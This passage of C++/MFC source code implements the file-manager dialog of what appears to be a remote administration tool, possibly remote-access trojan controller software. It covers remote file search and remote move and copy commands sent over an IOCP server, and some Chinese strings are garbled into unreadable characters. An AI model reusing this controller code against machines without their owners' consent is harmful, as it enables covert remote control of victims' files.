            //  Skip until we hit the first "\" (\\Server\).

            while(*p && *p != TEXT('\\')) {
                p = CharNext(p);
            }

            // Advance over it.

            if(*p) {
                p++;
            }

            //  Skip until we hit the second "\" (\\Server\Share\).

            while(*p && *p != TEXT('\\')) {
                p = CharNext(p);
            }

            // Advance over it also.

            if(*p) {
                p++;
            }

        } else if(*(p+1) == TEXT(':')) { // Not a UNC.  See if it's <drive>:
            p++;
            p++;

            // If it exists, skip over the root specifier

            if(*p && (*p == TEXT('\\'))) {
                p++;
            }
        }

        while(*p) {
            if(*p == TEXT('\\')) {
                *p = TEXT('\0');
                dwAttributes = GetFileAttributes(pszDirCopy);

                // Nothing exists with this name.  Try to make the directory name and error if unable to.
                if(dwAttributes == 0xffffffff) {
                    if(!CreateDirectory(pszDirCopy, NULL)) {
                        if(GetLastError() != ERROR_ALREADY_EXISTS) {
                            free(pszDirCopy);
                            return FALSE;
                        }
                    }
                } else {
                    if((dwAttributes & FILE_ATTRIBUTE_DIRECTORY) != FILE_ATTRIBUTE_DIRECTORY) {
                        // Something exists with this name, but it's not a directory... Error
                        free(pszDirCopy);
                        return FALSE;
                    }
                }

                *p = TEXT('\\');
            }

            p = CharNext(p);
        }
    } __except(EXCEPTION_EXECUTE_HANDLER) {
        // SetLastError(GetExceptionCode());
        free(pszDirCopy);
        return FALSE;
    }

    free(pszDirCopy);
    return TRUE;
}


int CFileManagerDlg::OnCreateControl(LPCREATECONTROLSTRUCT lpCreateControl)
{
    if (lpCreateControl->nID == IDR_LOCAL_VIEW) {
        lpCreateControl->controlType = xtpControlSplitButtonPopup;
        return TRUE;
    }

    if (lpCreateControl->nID == IDR_REMOTE_VIEW) {
        lpCreateControl->controlType = xtpControlSplitButtonPopup;
        return TRUE;
    }

    if (lpCreateControl->nID == ID_SEARCH_TEXT) {
        pComboSize = new CXTPControlComboBox();
        pComboSize->SetDropDownListStyle();
        pComboSize->SetWidth(130); // ���

        pComboSize->InsertString(0,".jpg");
        pComboSize->InsertString(1,".doc");
        pComboSize->InsertString(2,".avi");

        lpCreateControl->pControl = pComboSize;

        return TRUE;
    }


    if (lpCreateControl->nID == ID_SEARCH_SUBFOLDER) {
        CXTPControlButton* pControl = new CXTPControlCheckBox();
        pControl->SetFlags(xtpFlagRightAlign);
        pControl->SetChecked(TRUE);
        lpCreateControl->pControl = pControl;
        return TRUE;
    }


    return FALSE;
}

void CFileManagerDlg::PostNcDestroy()
{
    // TODO: Add your specialized code here and/or call the base class
    if (!m_bOnClose)
        OnClose();

    delete this;
    CDialog::PostNcDestroy();
}

void CFileManagerDlg::FixedRemoteSearchFileList(BYTE *pbBuffer, DWORD dwBufferLen)
{
    //	m_list_remote_search.SetRedraw(FALSE);

    char *pList = (char *)(pbBuffer + 1);
    int			nItemIndex = 0;
    for(char *pBase = pList; pList - pBase < dwBufferLen - 1;) {
        char	*pszFileName = NULL;
        DWORD	dwFileSizeHigh = 0;
        DWORD	dwFileSizeLow  = 0;
        FILETIME	ftm_strReceiveLocalFileTime;
        int		nItem = 0;
        bool	bIsInsert = false;
        int	nType = *pList ? FILE_ATTRIBUTE_DIRECTORY : FILE_ATTRIBUTE_NORMAL;

        pszFileName = ++pList;

        nItem = m_list_remote_search.InsertItem(nItemIndex++, pszFileName, GetIconIndex(pszFileName, nType));
        m_list_remote_search.SetItemData(nItem, nType == FILE_ATTRIBUTE_DIRECTORY);


        pList += lstrlen(pszFileName)+1;

        memcpy(&dwFileSizeHigh, pList, 4);
        memcpy(&dwFileSizeLow, pList + 4, 4);
        CString strSize;
        strSize.Format(_T("%10d KB"), (dwFileSizeHigh * (MAXDWORD)) / 1024 + dwFileSizeLow / 1024 + (dwFileSizeLow % 1024 ? 1 : 0));

        m_list_remote_search.SetItemText(nItem, 1, strSize);
        memcpy(&ftm_strReceiveLocalFileTime, pList + 8, sizeof(FILETIME));
        CTime	time(ftm_strReceiveLocalFileTime);
        m_list_remote_search.SetItemText(nItem, 2,time.Format(_T("%Y-%m-%d %H:%M")));
        pList += 16;
    }

    //	m_list_remote_search.SetRedraw(TRUE);
    m_ProgressCtrl->StepIt();
}

void CFileManagerDlg::OnSearchResult()
{
    // TODO: Add your command handler code here
    BOOL bState = m_wndToolBar_Search.GetControls()->FindControl(ID_SEARCH_RESULT)->GetChecked();

    m_list_remote.ShowWindow(bState ? SW_SHOW : SW_HIDE);
    m_list_remote_search.ShowWindow(bState ? SW_HIDE : SW_SHOW);

    m_wndToolBar_Search.GetControls()->FindControl(ID_SEARCH_RESULT)->SetChecked(!bState);
}

void CFileManagerDlg::OnSearchStart()
{
    // TODO: Add your command handler code here
    CString str;
    str = pComboSize->GetEditText();
    if (str.IsEmpty()||m_Remote_Path.IsEmpty()) {
        ::MessageBox(m_hWnd,"����·����Ҫ�����Ĺؼ����Ƿ�Ϊ��!\r\n��ʾ:�����Ҫ������Ŀ¼�� �磺����E�� �����E��Ŀ¼\r\n��������E���������ļ�",NULL,NULL);
        return;
    }
    FILESEARCH filesearch;
    lstrcpy(filesearch.SearchPath,m_Remote_Path.GetBuffer(0));
    lstrcpy(filesearch.SearchFileName,str.GetBuffer(0));
    filesearch.bEnabledSubfolder = m_wndToolBar_Search.GetControls()->FindControl(ID_SEARCH_SUBFOLDER)->GetChecked();

    int	PacketSize = sizeof(FILESEARCH) + 1;
    BYTE	*bPacket = (BYTE *)LocalAlloc(LPTR, PacketSize);

    bPacket[0] = COMMAND_FILES_SEARCH_START;
    memcpy(bPacket + 1, &filesearch, PacketSize - 1 );
    m_iocpServer->Send(m_pContext, bPacket, PacketSize);
    LocalFree(bPacket);

    // �õ���������ǰ������
    m_list_remote_search.DeleteAllItems();
    m_list_remote_search.EnableWindow(FALSE);
    m_ProgressCtrl->SetPos(0);

    if(m_wndToolBar_Search.GetControls()->FindControl(ID_SEARCH_RESULT)->GetChecked() == FALSE)
        OnSearchResult();

    EnableSearchButtn(FALSE);
}

void CFileManagerDlg::OnSearchStop()
{
    // TODO: Add your command handler code here
    BYTE  bToken = COMMAND_FILES_SEARCH_STOP;
    m_iocpServer->Send(m_pContext, &bToken, sizeof(BYTE));
}


// bEnable = TURE  ��������
void CFileManagerDlg::EnableSearchButtn(BOOL bEnable)
{
    m_wndToolBar_Search.GetControls()->FindControl(ID_SEARCH_START)->SetEnabled(bEnable);
    m_wndToolBar_Search.GetControls()->FindControl(ID_SEARCH_STOP)->SetEnabled(!bEnable);
}

void CFileManagerDlg::OnMenuitemOpenFilepath()
{
    // TODO: Add your command handler code here
    if(m_wndToolBar_Search.GetControls()->FindControl(ID_SEARCH_RESULT)->GetChecked() == TRUE)
        OnSearchResult();

    int Index = 0;

    Index = m_list_remote_search.GetSelectionMark();
    if( Index == -1 )
        return;

    CString str  = m_list_remote_search.GetItemText(Index, 0);

    Index = str.ReverseFind('\\');

    if( Index == -1 )
        return;

    m_Remote_Path = "";

    GetRemoteFileList(str.Left(Index));
}

void CFileManagerDlg::OnCheckSubfolder()
{
    m_wndToolBar_Search.GetControls()->FindControl(ID_SEARCH_SUBFOLDER)->SetChecked(!m_wndToolBar_Search.GetControls()->FindControl(ID_SEARCH_SUBFOLDER)->GetChecked());
}

void CFileManagerDlg::OnMenuitemMove()
{
    // TODO: Add your command handler code here
    if (m_list_remote.GetSelectedCount() < 1)
        return;

    m_Remote_Move_Job.RemoveAll();
    POSITION pos = m_list_remote.GetFirstSelectedItemPosition(); //iterator for the CListCtrl
    while(pos) { //so long as we have a valid POSITION, we keep iterating
        int nItem = m_list_remote.GetNextSelectedItem(pos);
        CString	file = m_Remote_Path + m_list_remote.GetItemText(nItem, 0);
        // �����Ŀ¼
        if (m_list_remote.GetItemData(nItem))
            file += '\\';

        m_Remote_Move_Job.AddTail(file);
    } //EO while(pos) -- at this point we have deleted the moving items and stored them in memory}

    m_bIsCopy = false;
}

void CFileManagerDlg::OnMenuitemCopy()
{
    // TODO: Add your command handler code here
    if (m_list_remote.GetSelectedCount() < 1)
        return;

    m_Remote_Move_Job.RemoveAll();
    POSITION pos = m_list_remote.GetFirstSelectedItemPosition(); //iterator for the CListCtrl
    while(pos) { //so long as we have a valid POSITION, we keep iterating
        int nItem = m_list_remote.GetNextSelectedItem(pos);
        CString	file = m_Remote_Path + m_list_remote.GetItemText(nItem, 0);
        // �����Ŀ¼
        if (m_list_remote.GetItemData(nItem))
            file += '\\';

        m_Remote_Move_Job.AddTail(file);
    } //EO while(pos) -- at this point we have deleted the moving items and stored them in memory}

    m_bIsCopy = true;

}

void CFileManagerDlg::OnMenuitemPaste()
{
    // TODO: Add your command handler code here
    if (m_Remote_Move_Job.IsEmpty() || m_Remote_Path == "")
        return;
    m_bIsUpload = false;
    EnableControl(FALSE);
    // ���͵�һ��ɾ������
    SendMoveJob();
}

BOOL CFileManagerDlg::SendMoveJob()
{
    if (m_Remote_Move_Job.IsEmpty() || m_Remote_Path == "")
        return FALSE;
    // ������һ��������������
    FILEMOVE fileMove;
    ZeroMemory(&fileMove, sizeof(FILEMOVE));
    CString file = m_Remote_Move_Job.GetHead();
    int		nPacketSize = sizeof(FILEMOVE) + 1;
    BYTE	*bPacket = (BYTE *)LocalAlloc(LPTR, nPacketSize);


    if (file.GetAt(file.GetLength() - 1) == '\\') {
        lstrcpy(fileMove.lpExistingFileName,file.Mid(0,file.ReverseFind('\\')));
        strShowText.Format(_T("Զ�̣��ƶ�Ŀ¼ %s\\*.* ���"), file);
        bPacket[0] = COMMAND_MOVE_DIRECTORY;
        file.Delete( file.GetLength() -1,1);
        lstrcpy(fileMove.lpNewFileName,m_Remote_Path.GetBuffer(0) + file.Mid(file.ReverseFind('\\') + 1,file.GetLength()));
    } else {
        strShowText.Format(_T("Զ�̣��ƶ��ļ� %s ���"), file);
        bPacket[0] = COMMAND_MOVE_FILE;
        lstrcpy(fileMove.lpExistingFileName,file.GetBuffer(0));

        lstrcpy(fileMove.lpNewFileName,m_Remote_Path.GetBuffer(0) + file.Mid(file.ReverseFind('\\') +1,file.GetLength()));
    }

    fileMove.bIsCopy  = m_bIsCopy;


    memcpy(bPacket+1,&fileMove,sizeof(FILEMOVE));
    m_iocpServer->Send(m_pContext, bPacket, nPacketSize);

    LocalFree(bPacket);

    m_Remote_Move_Job.RemoveHead();

    PostMessage(WM_SHOW_MSG,0,0);

    return TRUE;
}
